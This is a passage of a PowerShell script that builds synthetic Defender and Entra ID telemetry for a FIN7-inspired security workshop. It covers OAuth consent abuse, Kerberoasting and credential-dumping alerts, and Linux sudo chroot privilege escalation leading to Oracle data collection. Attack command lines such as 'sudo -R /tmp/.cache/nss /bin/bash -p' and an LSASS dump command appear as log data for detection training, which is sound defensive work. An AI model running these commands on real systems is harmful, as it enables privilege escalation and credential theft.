    Timestamp = Format-WorkshopTime $signinTime
    Application = 'Office 365'
    ApplicationId = '00000003-0000-0ff1-ce00-000000000000'
    LogonType = 'Interactive'
    ErrorCode = 0
    CorrelationId = New-StableGuid 'signin-correlation'
    SessionId = New-StableGuid 'signin-session'
    AccountDisplayName = $victor.DisplayName
    AccountObjectId = $victor.ObjectId
    AccountUpn = $victor.Upn
    IsExternalUser = 0
    IsGuestUser = $false
    ResourceDisplayName = 'Office 365 Exchange Online'
    ResourceId = '00000002-0000-0ff1-ce00-000000000000'
    IPAddress = $externalIp
    Country = 'DE'
    State = 'Hesse'
    City = 'Frankfurt am Main'
    Latitude = '50.1109'
    Longitude = '8.6821'
    UserAgent = 'Mozilla/5.0 FIN7-workshop'
    ClientAppUsed = 'Browser'
    ConditionalAccessStatus = 'success'
    DeviceTrustType = 'Unmanaged'
    RiskLevelDuringSignIn = 'high'
    RiskLevelAggregated = 'high'
    RiskState = 'atRisk'
    RiskEventTypes = '["unfamiliarFeatures","anonymousIPAddress"]'
    AuthenticationRequirement = 'multiFactorAuthentication'
    TokenIssuerType = 'AzureAD'
    ReportId = 5801
}
Add-Record -Table 'EntraIdSignInEvents' -Time $signinTime -Values $signinCommon
Add-Record -Table 'AADSignInEventsBeta' -Time $signinTime -Values $signinCommon
Add-Record -Table 'SigninLogs' -Time $signinTime -Values @{
    TimeGenerated = Format-WorkshopTime $signinTime
    CreatedDateTime = Format-WorkshopTime $signinTime
    AADTenantId = $tenantId
    AppDisplayName = 'Office 365 Exchange Online'
    AppId = '00000002-0000-0ff1-ce00-000000000000'
    AuthenticationMethodsUsed = 'Password,SMS'
    AuthenticationRequirement = 'multiFactorAuthentication'
    ClientAppUsed = 'Browser'
    ConditionalAccessStatus = 'success'
    CorrelationId = New-StableGuid 'signin-correlation'
    DeviceDetail = @{ operatingSystem = 'Windows'; browser = 'Chrome'; isCompliant = $false; trustType = 'Unmanaged' }
    Id = New-StableGuid 'signin-log'
    Identity = $victor.DisplayName
    IPAddress = $externalIp
    IsInteractive = $true
    IsRisky = $true
    Location = 'DE'
    LocationDetails = @{ city = 'Frankfurt am Main'; state = 'Hesse'; countryOrRegion = 'DE'; geoCoordinates = @{ latitude = 50.1109; longitude = 8.6821 } }
    MfaDetail = '{"authMethod":"SMS","authDetail":"Temporary workshop MFA path"}'
    OperationName = 'Sign-in activity'
    ResourceDisplayName = 'Office 365 Exchange Online'
    ResultType = '0'
    ResultDescription = 'Success'
    RiskLevel = 'high'
    RiskLevelDuringSignIn = 'high'
    RiskState = 'atRisk'
    RiskEventTypes = 'unfamiliarFeatures,anonymousIPAddress'
    Status = @{ errorCode = 0; failureReason = 'Other'; additionalDetails = 'MFA completed by SMS' }
    Type = 'SigninLogs'
    UserAgent = 'Mozilla/5.0 FIN7-workshop'
    UserDisplayName = $victor.DisplayName
    UserId = $victor.ObjectId
    UserPrincipalName = $victor.Upn
    UserType = 'Member'
}

Add-Record -Table 'AADNonInteractiveUserSignInLogs' -Time $StartTime.AddMinutes(4) -Values @{
    TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes(4)
    CreatedDateTime = Format-WorkshopTime $StartTime.AddMinutes(4)
    AADTenantId = $tenantId
    AppDisplayName = 'Microsoft Graph'
    AppId = '00000003-0000-0000-c000-000000000000'
    IPAddress = $externalIp
    IsInteractive = $false
    ResultType = '0'
    ResultDescription = 'Success'
    UserDisplayName = $victor.DisplayName
    UserId = $victor.ObjectId
    UserPrincipalName = $victor.Upn
    Type = 'AADNonInteractiveUserSignInLogs'
}

Add-Record -Table 'CloudAppEvents' -Time $StartTime.AddMinutes(5) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(5)
    ActionType = 'OAuthAppConsentGranted'
    Application = 'Microsoft 365'
    ApplicationId = '00000003-0000-0000-c000-000000000000'
    AccountObjectId = $victor.ObjectId
    AccountId = $victor.Upn
    AccountDisplayName = $victor.DisplayName
    IsAdminOperation = $false
    DeviceType = 'Windows'
    OSPlatform = 'Windows'
    IPAddress = $externalIp
    CountryCode = 'DE'
    City = 'Frankfurt am Main'
    UserAgent = 'Mozilla/5.0 FIN7-workshop'
    ActivityType = 'Consent to application'
    ObjectName = 'USAG Cyber Sync Helper'
    ObjectType = 'OAuthApplication'
    ReportId = 5901
    AccountType = 'Regular'
    OAuthAppId = New-StableGuid 'malicious-oauth'
    RawEventData = @{ ConsentType = 'User'; Scopes = 'Mail.Read Files.Read.All offline_access' }
    AdditionalFields = '{"Technique":"T1528","Scenario":"Suspicious OAuth consent"}'
}
Add-Record -Table 'AuditLogs' -Time $StartTime.AddMinutes(5) -Values @{
    TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes(5)
    ActivityDateTime = Format-WorkshopTime $StartTime.AddMinutes(5)
    AADOperationType = 'Add'
    AADTenantId = $tenantId
    ActivityDisplayName = 'Consent to application'
    Category = 'ApplicationManagement'
    CorrelationId = New-StableGuid 'oauth-consent'
    Id = New-StableGuid 'audit-oauth'
    Identity = $victor.Upn
    InitiatedBy = @{ user = @{ userPrincipalName = $victor.Upn; id = $victor.ObjectId; ipAddress = $externalIp } }
    LoggedByService = 'Core Directory'
    OperationName = 'Consent to application'
    Result = 'success'
    ResultType = 'Success'
    TargetResources = @(@{ displayName = 'USAG Cyber Sync Helper'; type = 'ServicePrincipal'; id = New-StableGuid 'malicious-oauth' })
    Type = 'AuditLogs'
}

foreach ($offset in 7, 8, 9) {
    $requestUri = if ($offset -eq 7) { "https://graph.microsoft.com/v1.0/users/$($victor.Upn)/messages" } elseif ($offset -eq 8) { "https://graph.microsoft.com/v1.0/users/$($victor.Upn)/drive/root/children" } else { 'https://graph.microsoft.com/v1.0/users' }
    Add-Record -Table 'GraphApiAuditEvents' -Time $StartTime.AddMinutes($offset) -Values @{
        Timestamp = Format-WorkshopTime $StartTime.AddMinutes($offset)
        IdentityProvider = 'AzureAD'
        ApiVersion = 'v1.0'
        ApplicationId = New-StableGuid 'malicious-oauth'
        IPAddress = $externalIp
        ClientRequestId = New-StableGuid "client-graph-$offset"
        EntityType = if ($offset -eq 7) { 'Message' } elseif ($offset -eq 8) { 'DriveItem' } else { 'User' }
        RequestUri = $requestUri
        AccountObjectId = $victor.ObjectId
        OperationId = New-StableGuid "graph-op-$offset"
        Location = 'DE'
        RequestDuration = 143
        RequestId = New-StableGuid "graph-request-$offset"
        RequestMethod = 'GET'
        ResponseStatusCode = 200
        Scopes = 'Mail.Read Files.Read.All offline_access'
        UniqueTokenIdentifier = New-StableGuid 'graph-token'
        TargetWorkload = 'MicrosoftGraph'
        ServicePrincipalId = New-StableGuid 'malicious-oauth-sp'
        ResponseSize = 40896
    }
    Add-Record -Table 'MicrosoftGraphActivityLogs' -Time $StartTime.AddMinutes($offset) -Values @{
        TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes($offset)
        TenantId = $tenantId
        UserId = $victor.ObjectId
        AppId = New-StableGuid 'malicious-oauth'
        IPAddress = $externalIp
        RequestMethod = 'GET'
        RequestUri = $requestUri.Replace('https://graph.microsoft.com', '')
        ResponseStatusCode = 200
        UserAgent = 'Mozilla/5.0 FIN7-workshop'
        ServicePrincipalId = New-StableGuid 'malicious-oauth-sp'
        SignInActivityId = New-StableGuid 'signin-log'
        UniqueTokenId = New-StableGuid 'graph-token'
        Type = 'MicrosoftGraphActivityLogs'
    }
}

$alerts = @(
    [pscustomobject]@{ Id = 'FIN7-001'; Offset = 15; Title = 'Suspicious PowerShell credential discovery'; Category = 'CredentialAccess'; Severity = 'Medium'; Source = 'Microsoft Defender for Endpoint'; Technique = 'T1552.002'; Entity = 'Process'; File = 'powershell.exe'; Command = 'collect-reg-creds.ps1' },
    [pscustomobject]@{ Id = 'FIN7-002'; Offset = 35; Title = 'Suspected Kerberoasting activity'; Category = 'CredentialAccess'; Severity = 'High'; Source = 'Microsoft Defender for Identity'; Technique = 'T1558.003'; Entity = 'User'; File = "$toolRu.exe"; Command = "$toolRu.exe kerberoast" },
    [pscustomobject]@{ Id = 'FIN7-003'; Offset = 50; Title = "Credential dumping from $targetLs"; Category = 'CredentialAccess'; Severity = 'High'; Source = 'Microsoft Defender for Endpoint'; Technique = 'T1003.001'; Entity = 'File'; File = "$targetLsLower.dmp"; Command = "$toolProc.exe -ma $targetLsLower.exe" },
    [pscustomobject]@{ Id = 'FIN7-004'; Offset = 65; Title = 'Password store harvesting tool observed'; Category = 'CredentialAccess'; Severity = 'High'; Source = 'Microsoft Defender for Endpoint'; Technique = 'T1555'; Entity = 'Process'; File = "$toolLa.exe"; Command = "$toolLa.exe all" },
    [pscustomobject]@{ Id = 'FIN7-005'; Offset = 73; Title = "$toolMi credential dumping"; Category = 'CredentialAccess'; Severity = 'High'; Source = 'Microsoft Defender for Endpoint'; Technique = 'T1003.001'; Entity = 'Process'; File = "$($toolMi.ToLower()).exe"; Command = $secretVerb }
)
foreach ($alert in $alerts) {
    $time = $StartTime.AddMinutes($alert.Offset)
    Add-Record -Table 'AlertInfo' -Time $time -Values @{
        Timestamp = Format-WorkshopTime $time
        AlertId = $alert.Id
        Title = $alert.Title
        Category = $alert.Category
        Severity = $alert.Severity
        ServiceSource = $alert.Source
        DetectionSource = if ($alert.Source -like '*Identity') { 'MDI sensor' } else { 'MDE sensor' }
        AttackTechniques = $alert.Technique
    }
    Add-Record -Table 'AlertEvidence' -Time $time -Values @{
        Timestamp = Format-WorkshopTime $time
        AlertId = $alert.Id
        Title = $alert.Title
        Categories = "[`"$($alert.Category)`"]"
        AttackTechniques = $alert.Technique
        ServiceSource = $alert.Source
        DetectionSource = if ($alert.Source -like '*Identity') { 'MDI sensor' } else { 'MDE sensor' }
        EntityType = $alert.Entity
        EvidenceRole = 'Impacted'
        EvidenceDirection = 'Source'
        FileName = $alert.File
        FolderPath = "$stage\$($alert.File)"
        AccountName = $victor.Name
        AccountDomain = $adDomain
        AccountSid = $victor.Sid
        AccountObjectId = $victor.ObjectId
        AccountUpn = $victor.Upn
        DeviceId = $win04.DeviceId
        DeviceName = $win04.Name
        LocalIP = $win04.IP
        ProcessCommandLine = $alert.Command
        AdditionalFields = "{`"ThreatActor`":`"FIN7-inspired`",`"Technique`":`"$($alert.Technique)`"}"
        Severity = $alert.Severity
    }
}

$linuxAdminUser = $alice.Name -replace '\.', ''
$linuxExternalIp = '203.0.113.91'
$linuxAlertTime = $StartTime.AddMinutes(68)
Add-Record -Table 'DeviceLogonEvents' -Time $StartTime.AddMinutes(61) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(61)
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    ActionType = 'LogonFailed'
    LogonType = 'Ssh'
    Protocol = 'Ssh'
    AccountDomain = $linux03.ShortName
    AccountName = $linuxAdminUser
    AccountSid = $alice.Sid
    AccountUpn = $alice.Upn
    RemoteIP = $linuxExternalIp
    RemoteDeviceName = 'unknown-internet-host'
    IsLocalAdmin = $false
    LogonId = 860061
    ReportId = 860061
    AdditionalFields = '{"SourceLog":"/var/log/auth.log","PamResult":"authentication failure","Scenario":"Linux SSH brute force"}'
}
Add-Record -Table 'DeviceLogonEvents' -Time $StartTime.AddMinutes(64) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(64)
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    ActionType = 'LogonSuccess'
    LogonType = 'Ssh'
    Protocol = 'Ssh'
    AccountDomain = $linux03.ShortName
    AccountName = $linuxAdminUser
    AccountSid = $alice.Sid
    AccountUpn = $alice.Upn
    RemoteIP = '10.42.30.10'
    RemoteDeviceName = 'ADMIN-JUMP01.usag-cyber.local'
    IsLocalAdmin = $false
    LogonId = 860064
    ReportId = 860064
    AdditionalFields = '{"SourceLog":"/var/log/auth.log","PamResult":"Accepted publickey","Scenario":"Linux SSH login"}'
}
Add-Record -Table 'DeviceProcessEvents' -Time $StartTime.AddMinutes(65) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(65)
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    ActionType = 'ProcessCreated'
    FileName = 'sudo'
    FolderPath = '/usr/bin/sudo'
    ProcessId = 18650
    ProcessCommandLine = 'sudo -R /tmp/.cache/nss /bin/bash -p'
    ProcessCreationTime = Format-WorkshopTime $StartTime.AddMinutes(65)
    ProcessIntegrityLevel = 'Unknown'
    ProcessTokenElevation = 'None'
    AccountDomain = $linux03.ShortName
    AccountName = $linuxAdminUser
    AccountSid = $alice.Sid
    AccountUpn = $alice.Upn
    InitiatingProcessAccountDomain = $linux03.ShortName
    InitiatingProcessAccountName = $linuxAdminUser
    InitiatingProcessAccountSid = $alice.Sid
    InitiatingProcessAccountUpn = $alice.Upn
    InitiatingProcessFileName = 'bash'
    InitiatingProcessFolderPath = '/usr/bin/bash'
    InitiatingProcessCommandLine = '-bash'
    InitiatingProcessParentFileName = 'sshd'
    ReportId = 860065
    AdditionalFields = '{"Technique":"T1548.003","SourceLog":"/var/log/auth.log","Scenario":"Suspicious sudo chroot usage"}'
}
Add-Record -Table 'DeviceFileEvents' -Time $StartTime.AddMinutes(66) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(66)
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    ActionType = 'FileCreated'
    FileName = 'nsswitch.conf'
    FolderPath = '/tmp/.cache/nss/etc/nsswitch.conf'
    FileSize = 512
    InitiatingProcessAccountDomain = $linux03.ShortName
    InitiatingProcessAccountName = $linuxAdminUser
    InitiatingProcessAccountSid = $alice.Sid
    InitiatingProcessAccountUpn = $alice.Upn
    InitiatingProcessFileName = 'bash'
    InitiatingProcessCommandLine = 'printf passwd: files > /tmp/.cache/nss/etc/nsswitch.conf'
    InitiatingProcessId = 18649
    InitiatingProcessCreationTime = Format-WorkshopTime $StartTime.AddMinutes(65)
    ReportId = 860066
    AdditionalFields = '{"Technique":"T1548.003","SourceLog":"/var/log/audit/audit.log","Scenario":"Linux privilege escalation staging"}'
}
Add-Record -Table 'DeviceImageLoadEvents' -Time $StartTime.AddMinutes(66) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(66)
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    ActionType = 'ImageLoaded'
    FileName = 'libnss_files.so.2'
    FolderPath = '/lib/x86_64-linux-gnu/libnss_files.so.2'
    FileSize = 55936
    SHA1 = New-StableHex 'linux-libnss-files-sha1' 40
    SHA256 = New-StableHex 'linux-libnss-files-sha256' 64
    MD5 = New-StableHex 'linux-libnss-files-md5' 32
    InitiatingProcessAccountDomain = $linux03.ShortName
    InitiatingProcessAccountName = $linuxAdminUser
    InitiatingProcessAccountSid = $alice.Sid
    InitiatingProcessAccountUpn = $alice.Upn
    InitiatingProcessFileName = 'sudo'
    InitiatingProcessFolderPath = '/usr/bin/sudo'
    InitiatingProcessCommandLine = 'sudo -R /tmp/.cache/nss /bin/bash -p'
    ReportId = 860067
    AdditionalFields = '{"Scenario":"Linux shared object load","Source":"ld.so"}'
}
Add-Record -Table 'DeviceNetworkEvents' -Time $StartTime.AddMinutes(67) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(67)
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    ActionType = 'ConnectionSuccess'
    LocalIP = $linux03.IP
    LocalPort = 49322
    RemoteIP = '198.51.100.88'
    RemoteUrl = 'ipp-printer-discovery.example'
    RemotePort = 631
    Protocol = 'Udp'
    InitiatingProcessFileName = 'cups-browsed'
    InitiatingProcessCommandLine = '/usr/sbin/cups-browsed'
    InitiatingProcessAccountDomain = 'root'
    InitiatingProcessAccountName = 'root'
    ReportId = 8600671
    AdditionalFields = '{"CveContext":"CVE-2024-47176","Scenario":"CUPS IPP exposure"}'
}
Add-Record -Table 'DeviceEvents' -Time $StartTime.AddMinutes(68) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(68)
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    ActionType = 'AuditdProcessExecution'
    FileName = 'sudo'
    FolderPath = '/usr/bin/sudo'
    ProcessCommandLine = 'sudo -R /tmp/.cache/nss /bin/bash -p'
    AccountDomain = $linux03.ShortName
    AccountName = $linuxAdminUser
    AccountSid = $alice.Sid
    AccountUpn = $alice.Upn
    ReportId = 860068
    AdditionalFields = '{"SourceLog":"/var/log/audit/audit.log","AuditKey":"priv_esc","Technique":"T1548.003"}'
}
Add-Record -Table 'AlertInfo' -Time $linuxAlertTime -Values @{
    Timestamp = Format-WorkshopTime $linuxAlertTime
    AlertId = 'LINUX-001'
    Title = 'Suspicious sudo chroot usage on Linux server'
    Category = 'PrivilegeEscalation'
    Severity = 'High'
    ServiceSource = 'Microsoft Defender for Endpoint'
    DetectionSource = 'MDE sensor'
    AttackTechniques = 'T1548.003,T1059.004'
}
Add-Record -Table 'AlertEvidence' -Time $linuxAlertTime -Values @{
    Timestamp = Format-WorkshopTime $linuxAlertTime
    AlertId = 'LINUX-001'
    Title = 'Suspicious sudo chroot usage on Linux server'
    Categories = '["PrivilegeEscalation"]'
    AttackTechniques = 'T1548.003,T1059.004'
    ServiceSource = 'Microsoft Defender for Endpoint'
    DetectionSource = 'MDE sensor'
    EntityType = 'Process'
    EvidenceRole = 'Impacted'
    EvidenceDirection = 'Source'
    FileName = 'sudo'
    FolderPath = '/usr/bin/sudo'
    AccountName = $linuxAdminUser
    AccountDomain = $linux03.ShortName
    AccountSid = $alice.Sid
    AccountObjectId = $alice.ObjectId
    AccountUpn = $alice.Upn
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    LocalIP = $linux03.IP
    ProcessCommandLine = 'sudo -R /tmp/.cache/nss /bin/bash -p'
    AdditionalFields = '{"OSProfile":"Ubuntu","SourceLogs":["/var/log/auth.log","/var/log/audit/audit.log"],"CveContext":"CVE-2025-32463"}'
    Severity = 'High'
}
$oracleBranchTime = $StartTime.AddMinutes(69)
Add-Record -Table 'DeviceFileEvents' -Time $oracleBranchTime -Values @{
    Timestamp = Format-WorkshopTime $oracleBranchTime
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    ActionType = 'FileCreated'
    FileName = 'oracle_privcheck.py'
    FolderPath = '/tmp/.cache/oracle_privcheck.py'
    FileSize = 4096
    InitiatingProcessAccountDomain = $linux03.ShortName
    InitiatingProcessAccountName = $linuxAdminUser
    InitiatingProcessAccountSid = $alice.Sid
    InitiatingProcessAccountUpn = $alice.Upn
    InitiatingProcessFileName = 'scp'
    InitiatingProcessCommandLine = 'scp oracle_privcheck.py UBUNTU-03:/tmp/.cache/oracle_privcheck.py'
    InitiatingProcessCreationTime = Format-WorkshopTime $oracleBranchTime.AddSeconds(-30)
    ReportId = 860069
    AdditionalFields = '{"Scenario":"Synthetic Python helper staged for Linux privilege check","CveContext":"CVE-2025-32463"}'
}
Add-Record -Table 'DeviceProcessEvents' -Time $StartTime.AddMinutes(70) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(70)
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    ActionType = 'ProcessCreated'
    FileName = 'python3'
    FolderPath = '/usr/bin/python3'
    ProcessId = 18670
    ProcessCommandLine = 'python3 /tmp/.cache/oracle_privcheck.py --check sudo-cve-2025-32463 --target oracle'
    ProcessCreationTime = Format-WorkshopTime $StartTime.AddMinutes(70)
    ProcessIntegrityLevel = 'Unknown'
    ProcessTokenElevation = 'None'
    AccountDomain = $linux03.ShortName
    AccountName = $linuxAdminUser
    AccountSid = $alice.Sid
    AccountUpn = $alice.Upn
    InitiatingProcessAccountDomain = $linux03.ShortName
    InitiatingProcessAccountName = $linuxAdminUser
    InitiatingProcessAccountSid = $alice.Sid
    InitiatingProcessAccountUpn = $alice.Upn
    InitiatingProcessFileName = 'bash'
    InitiatingProcessFolderPath = '/usr/bin/bash'
    InitiatingProcessCommandLine = '-bash'
    InitiatingProcessParentFileName = 'sshd'
    ReportId = 860070
    AdditionalFields = '{"Technique":"T1059.006","CveContext":"CVE-2025-32463","Scenario":"Synthetic Python privilege-escalation helper"}'
}
Add-Record -Table 'DeviceFileEvents' -Time $StartTime.AddMinutes(71) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(71)
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    ActionType = 'FileCreated'
    FileName = 'ora_collect_linux_amd64'
    FolderPath = '/tmp/.cache/ora_collect_linux_amd64'
    FileSize = 1867776
    InitiatingProcessAccountDomain = $linux03.ShortName
    InitiatingProcessAccountName = $linuxAdminUser
    InitiatingProcessAccountSid = $alice.Sid
    InitiatingProcessAccountUpn = $alice.Upn
    InitiatingProcessFileName = 'python3'
    InitiatingProcessCommandLine = 'python3 /tmp/.cache/oracle_privcheck.py --check sudo-cve-2025-32463 --target oracle'
    InitiatingProcessCreationTime = Format-WorkshopTime $StartTime.AddMinutes(70)
    ReportId = 860071
    AdditionalFields = '{"Scenario":"Synthetic Go Oracle collection binary staged","Language":"Go"}'
}
Add-Record -Table 'DeviceProcessEvents' -Time $StartTime.AddMinutes(72) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(72)
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    ActionType = 'ProcessCreated'
    FileName = 'ora_collect_linux_amd64'
    FolderPath = '/tmp/.cache/ora_collect_linux_amd64'
    ProcessId = 18672
    ProcessCommandLine = '/tmp/.cache/ora_collect_linux_amd64 --target 10.42.20.35:1521 --service ORCL --query-name finance-user-catalog'
    ProcessCreationTime = Format-WorkshopTime $StartTime.AddMinutes(72)
    ProcessIntegrityLevel = 'Unknown'
    ProcessTokenElevation = 'None'
    AccountDomain = $linux03.ShortName
    AccountName = 'root'
    AccountSid = '0'
    AccountUpn = ''
    InitiatingProcessAccountDomain = $linux03.ShortName
    InitiatingProcessAccountName = $linuxAdminUser
    InitiatingProcessAccountSid = $alice.Sid
    InitiatingProcessAccountUpn = $alice.Upn
    InitiatingProcessFileName = 'sudo'
    InitiatingProcessFolderPath = '/usr/bin/sudo'
    InitiatingProcessCommandLine = 'sudo -R /tmp/.cache/nss /bin/bash -p'
    InitiatingProcessParentFileName = 'python3'
    ReportId = 860072
    AdditionalFields = '{"Technique":"T1005","Language":"Go","OriginalUser":"aliceweber","Scenario":"Oracle sensitive data collection over TNS"}'
}
Add-Record -Table 'DeviceNetworkEvents' -Time $StartTime.AddMinutes(72) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(72)
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    ActionType = 'ConnectionSuccess'
    LocalIP = $linux03.IP
    LocalPort = 50152
    RemoteIP = $linuxDb.IP
    RemoteUrl = $linuxDb.Name
    RemotePort = 1521
    Protocol = 'Tcp'
    InitiatingProcessFileName = 'ora_collect_linux_amd64'
    InitiatingProcessCommandLine = '/tmp/.cache/ora_collect_linux_amd64 --target 10.42.20.35:1521 --service ORCL --query-name finance-user-catalog'
    InitiatingProcessAccountDomain = $linux03.ShortName
    InitiatingProcessAccountName = 'root'
    ReportId = 8600721
    AdditionalFields = '{"Protocol":"Oracle TNS","Scenario":"Oracle database access from compromised Linux host"}'
}
Add-Record -Table 'DeviceProcessEvents' -Time $StartTime.AddMinutes(73) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(73)
    DeviceId = $linuxDb.DeviceId
    DeviceName = $linuxDb.Name
    ActionType = 'ProcessCreated'
    FileName = 'oracle'
    FolderPath = '/opt/oracle/product/19c/dbhome_1/bin/oracle'
    ProcessId = 19173
    ProcessCommandLine = 'oracleORCL (LOCAL=NO)'
    ProcessCreationTime = Format-WorkshopTime $StartTime.AddMinutes(73)
    ProcessIntegrityLevel = 'Unknown'
    ProcessTokenElevation = 'None'
    AccountDomain = $linuxDb.ShortName
    AccountName = 'oracle'
    InitiatingProcessAccountDomain = $linuxDb.ShortName
    InitiatingProcessAccountName = 'oracle'
    InitiatingProcessFileName = 'tnslsnr'
    InitiatingProcessFolderPath = '/opt/oracle/product/19c/dbhome_1/bin/tnslsnr'
    InitiatingProcessCommandLine = 'tnslsnr LISTENER -inherit'
    InitiatingProcessParentFileName = 'systemd'
    ReportId = 860073
    AdditionalFields = '{"Scenario":"Oracle foreground process spawned for remote TNS session","OracleSid":"ORCL"}'
}
Add-Record -Table 'DeviceFileEvents' -Time $StartTime.AddMinutes(74) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(74)
    DeviceId = $linuxDb.DeviceId
    DeviceName = $linuxDb.Name
    ActionType = 'FileCreated'
    FileName = 'finance_user_catalog.csv'
    FolderPath = '/tmp/.oracle/finance_user_catalog.csv'
    FileSize = 245760
    InitiatingProcessAccountDomain = $linuxDb.ShortName
    InitiatingProcessAccountName = 'oracle'
    InitiatingProcessFileName = 'oracle'
    InitiatingProcessCommandLine = 'oracleORCL (LOCAL=NO)'
    InitiatingProcessCreationTime = Format-WorkshopTime $StartTime.AddMinutes(73)
    ReportId = 860074
    AdditionalFields = '{"Technique":"T1005","Scenario":"Synthetic Oracle sensitive data export","SourcePath":"/u01/app/oracle/oradata/ORCL"}'
}
Add-Record -Table 'AlertInfo' -Time $StartTime.AddMinutes(74) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(74)
    AlertId = 'LINUX-002'
    Title = 'Linux privilege escalation followed by Oracle data access'
    Category = 'Collection'
    Severity = 'High'
    ServiceSource = 'Microsoft Defender for Endpoint'
    DetectionSource = 'MDE sensor'
    AttackTechniques = 'T1548.003,T1059.006,T1005'
}
Add-Record -Table 'AlertEvidence' -Time $StartTime.AddMinutes(74) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(74)
    AlertId = 'LINUX-002'
    Title = 'Linux privilege escalation followed by Oracle data access'
    Categories = '["Collection","PrivilegeEscalation"]'
    AttackTechniques = 'T1548.003,T1059.006,T1005'
    ServiceSource = 'Microsoft Defender for Endpoint'
    DetectionSource = 'MDE sensor'
    EntityType = 'Process'
    EvidenceRole = 'Impacted'
    EvidenceDirection = 'Source'
    FileName = 'ora_collect_linux_amd64'
    FolderPath = '/tmp/.cache/ora_collect_linux_amd64'
    AccountName = 'root'
    AccountDomain = $linux03.ShortName
    AccountSid = '0'
    AccountObjectId = ''
    AccountUpn = ''
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    LocalIP = $linux03.IP
    ProcessCommandLine = '/tmp/.cache/ora_collect_linux_amd64 --target 10.42.20.35:1521 --service ORCL --query-name finance-user-catalog'
    AdditionalFields = '{"OSProfile":"Ubuntu","Language":"Go","OriginalUser":"aliceweber","Database":"Oracle ORCL","SensitiveData":"Synthetic finance user catalog"}'
    Severity = 'High'
}
$linuxScenarioVulnerabilities = @(
    [pscustomobject]@{ Minute = 62; SoftwareName = 'openssh-server'; SoftwareVendor = 'OpenBSD'; SoftwareVersion = '1:9.6p1-3ubuntu13.5'; CveId = 'CVE-2024-6387'; Severity = 'High'; Update = 'Install patched openssh-server package' },
    [pscustomobject]@{ Minute = 66; SoftwareName = 'sudo'; SoftwareVendor = 'Sudo Project'; SoftwareVersion = '1.9.15p5-3ubuntu5.24.04.1'; CveId = 'CVE-2025-32463'; Severity = 'High'; Update = 'Install patched sudo package' },
    [pscustomobject]@{ Minute = 67; SoftwareName = 'cups'; SoftwareVendor = 'OpenPrinting'; SoftwareVersion = '2.4.7-1.2ubuntu7.3'; CveId = 'CVE-2024-47176'; Severity = 'Medium'; Update = 'Disable cups-browsed or install patched CUPS packages' },
    [pscustomobject]@{ Minute = 68; SoftwareName = 'glibc'; SoftwareVendor = 'GNU C Library'; SoftwareVersion = '2.39-0ubuntu8.4'; CveId = 'CVE-2023-4911'; Severity = 'Medium'; Update = 'Install patched libc6 package' }
)
foreach ($vulnerability in $linuxScenarioVulnerabilities) {
    $vulnTime = $StartTime.AddMinutes($vulnerability.Minute)
    Add-Record -Table 'DeviceTvmSoftwareVulnerabilities' -Time $vulnTime -Values @{
        DeviceId = $linux03.DeviceId
        DeviceName = $linux03.Name
        OSPlatform = 'Ubuntu'
        OSVersion = '24.04 LTS'
        OSArchitecture = 'x64'
        SoftwareVendor = $vulnerability.SoftwareVendor
        SoftwareName = $vulnerability.SoftwareName
        SoftwareVersion = $vulnerability.SoftwareVersion
        CveId = $vulnerability.CveId
        VulnerabilitySeverityLevel = $vulnerability.Severity
        RecommendedSecurityUpdate = $vulnerability.Update
        RecommendedSecurityUpdateId = $vulnerability.CveId
        CveTags = @('Linux', 'Ubuntu', 'Workshop')
    }
}

Add-Record -Table 'AADRiskyUsers' -Time $StartTime.AddMinutes(2) -Values @{
    TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes(2)
    AADTenantId = $tenantId
    Id = $victor.ObjectId
    UserPrincipalName = $victor.Upn
    RiskLevel = 'high'
    RiskState = 'atRisk'
    RiskDetail = 'none'
    Type = 'AADRiskyUsers'
}
Add-Record -Table 'AADUserRiskEvents' -Time $StartTime.AddMinutes(2) -Values @{
    TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes(2)
    AADTenantId = $tenantId
    Id = New-StableGuid 'risk-event-victor'
    UserPrincipalName = $victor.Upn
    UserId = $victor.ObjectId
    RiskEventType = 'unfamiliarFeatures'
    RiskLevel = 'high'
    RiskState = 'atRisk'
    IpAddress = $externalIp
    Location = 'DE'
    Type = 'AADUserRiskEvents'
}

foreach ($table in $script:Schemas.Keys) {
    if ($script:Records[$table].Count -gt 0) {
        continue
    }
    Add-Record -Table $table -Time $StartTime.AddMinutes(-10) -Values @{
        Timestamp = Format-WorkshopTime $StartTime.AddMinutes(-10)
